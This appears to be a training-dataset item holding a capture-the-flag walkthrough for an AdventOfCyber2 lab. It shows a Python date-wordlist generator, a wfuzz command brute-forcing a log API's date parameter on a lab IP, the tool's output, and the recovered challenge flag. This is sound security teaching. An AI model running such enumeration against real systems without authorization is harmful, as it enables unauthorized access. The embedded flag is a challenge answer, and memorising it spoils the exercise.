# UNCATEGORIZED — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: uncategorized

## Scenario

Describe the 'Fuzzing' technique used in 'AdventOfCyber2'.

## Analysis / Response

## Fuzzing
* We know from the challenge there's an a api that `creates logs using dates with a format of YYYYMMDD`
* Let's generate a wordlist with some potential dates:
```python
start_year = 2019
end_year = 2020

with open("dates.txt", "w") as fout:
	for year in range(start_year, end_year+1):
		for month in range(1,13):
			for day in range(1,32): # We don't have to worry about some minor inefficiencies in dates
				fout.write(f'{year}{month:02}{day:02}\n')
```
* Now that we have a set of potential dates in the file `dates.txt`, we can run the following command:
* `wfuzz -z file,dates.txt --hw 0 10.10.143.161/api/site-log.php?date=FUZZ`
	* `-z file,dates.txt` indicates that we're looking for files by replacing "FUZZ" witht the words in `dates.txt`
	* `--hw 0` indicates that we don't want any responses with 0 words
	* `10.10.143.161/api/site-log.php?date=FUZZ` indicates the file we are requesting with "FUZZ" replacing what should be the date
```
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.143.161/api/site-log.php?date=FUZZ
Total requests: 744

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                     
===================================================================

000000707:   200        0 L      1 W      13 Ch       "20201125"                                                                                                  

Total time: 13.23737
Processed Requests: 744
Filtered Requests: 743
Requests/sec.: 56.20448
```	
* We see that the date `20201125` worked
* Going to `http://10.10.143.161/api/site-log.php?date=20201125` gives us the flag: `THM{D4t3_AP1}`
